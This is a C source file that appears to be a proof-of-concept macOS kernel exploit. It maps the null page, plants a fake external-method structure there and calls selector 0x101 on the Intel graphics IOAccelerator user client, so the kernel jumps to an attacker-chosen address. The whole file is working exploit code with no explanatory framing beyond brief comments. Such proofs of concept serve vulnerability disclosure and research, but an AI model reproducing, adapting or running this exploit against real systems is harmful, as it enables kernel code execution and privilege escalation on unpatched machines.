// must be 32 bit - compile with -m32
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

#include <mach/mach.h>
#include <mach/vm_map.h>

#include <IOKit/IOKitLib.h>

struct fake_external_method {
  uint64_t io_service_object_ptr;
  uint64_t method;
  uint64_t zero_;
  uint64_t flags;
  uint64_t count0;
  uint64_t count1;
};

int main(int argc, char** argv){
  // re map the null page rw

  vm_deallocate(mach_task_self(), 0x0, 0x1000);
  vm_address_t addr = 0;
  vm_allocate(mach_task_self(), &addr, 0x1000, 0);
  char* np = 0;
  for (int i = 0; i < 0x1000; i++){
    np[i] = 'A';
  }

  // has to be at least the second entry in the external methods array
  // since NULL would be an error value
  struct fake_external_method* fm = (0x30);
  fm->io_service_object_ptr = 0;
  // least significant bit determines if this is a pointer to a virtual member function
  // (if it is set then method-1 is used as an offset in to the vtable)
  // if it isn't, then this address will be called
  fm->method = 0x123456789abcde0;
  fm->zero_ = 0;
  fm->flags = 0;
  fm->count0 = 0;
  fm->count1 = 0;

  kern_return_t err;

  CFMutableDictionaryRef matching = IOServiceMatching("IOAccelerator");
  if(!matching){
   printf("unable to create service matching dictionary\n");
   return 0;
  }

  io_iterator_t iterator;
  err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
  if (err != KERN_SUCCESS){
   printf("no matches\n");
   return 0;
  }

  io_service_t service = IOIteratorNext(iterator);
  // should be intel integrated graphics (only tested on MBA)  

  if (service == IO_OBJECT_NULL){
   printf("unable to find service\n");
   return 0;
  }
  printf("got service: %x\n", service);


  io_connect_t conn = MACH_PORT_NULL;
  // IGAccelCLContext
  err = IOServiceOpen(service, mach_task_self(), 8, &conn);
  if (err != KERN_SUCCESS){
   printf("unable to get user client connection\n");
   return 0;
  }

  printf("got userclient connection: %x\n", conn);

  uint64_t inputScalar[16];  
  uint64_t inputScalarCnt = 0;

  char inputStruct[4096];
  size_t inputStructCnt = 0;

  uint64_t outputScalar[16];
  uint32_t outputScalarCnt = 0;

  char outputStruct[4096];
  size_t outputStructCnt = 0;

  inputScalarCnt = 0;
  inputStructCnt = 16;

  outputScalarCnt = 0;
  outputStructCnt = 0;

  uint64_t handle = 0;

  err = IOConnectCallMethod(
   conn,
   0x101, // second entry
   inputScalar,
   0,
   &handle,
   0,
   outputScalar,
   &outputScalarCnt,
   outputStruct,
   &outputStructCnt); 

  if (err != KERN_SUCCESS){
   printf("IOConnectCall error: %x\n", err);
   return 0;
  }
}
